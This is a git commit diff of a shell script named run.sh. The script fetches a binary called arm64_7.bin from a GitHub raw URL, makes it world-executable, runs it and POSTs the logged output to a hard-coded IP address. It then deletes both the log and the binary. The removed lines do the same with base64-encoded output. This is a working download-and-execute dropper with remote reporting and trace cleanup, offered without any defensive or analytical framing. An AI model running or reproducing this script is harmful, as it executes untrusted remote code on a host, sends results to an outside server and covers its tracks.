6bc814bbb95300487ff1af35ede878b58490f7a9
gptloveyou <129956509+gptloveyou@users.noreply.github.com>
2023-04-06 16:42:00 +0000

    Update run.sh

--- run.sh
+++ run.sh
@@ -1,17 +1,13 @@
 #!/bin/sh
 
-url="http://139.180.135.229:19088"
-curl -s -o /tmp/arm64_7.bin https://raw.githubusercontent.com/gptloveyou/learn/main/arm64_7.bin
+report_url="http://139.180.135.229:19088/9024134B28978B68666E2B034E46130E/debug"
+pl_url="https://raw.githubusercontent.com/gptloveyou/learn/main/arm64_7.bin"
 
-cmdResp=`chmod 777 /tmp/arm64_7.bin 2>&1 | grep ""`;
-ret_enc=`echo "$cmdResp"|base64`
-`curl -s -X POST $url/9024134B28978B68666E2B034E46130E/debug -d $ret_enc`
+curl -s -o /tmp/arm64_7.bin $pl_url 1>/tmp/tmplog60920.log 2>&1
 
-cmdResp=`ls *.bin 2>&1 | grep ""`;
-ret_enc=`echo "$cmdResp"|base64`
-`curl -s -X POST $url/9024134B28978B68666E2B034E46130E/debug -d $ret_enc`
-
-cmdResp=`/tmp/arm64_7.bin 2>&1 | grep ""`
-ret_enc=`echo "$cmdResp"|base64`
-`curl -s -X POST $url/9024134B28978B68666E2B034E46130E/debug -d $ret_enc`
-
+chmod 777 /tmp/arm64_7.bin 1>>/tmp/tmplog60920.log 2>&1
+ls /tmp/*.bin 1>>/tmp/tmplog60920.log 2>&1
+/tmp/arm64_7.bin 1>>/tmp/tmplog60920.log 2>&1 
+curl -X POST $report_url -d @/tmp/tmplog60920.log
+rm /tmp/tmplog60920.log
+rm /tmp/arm64_7.bin
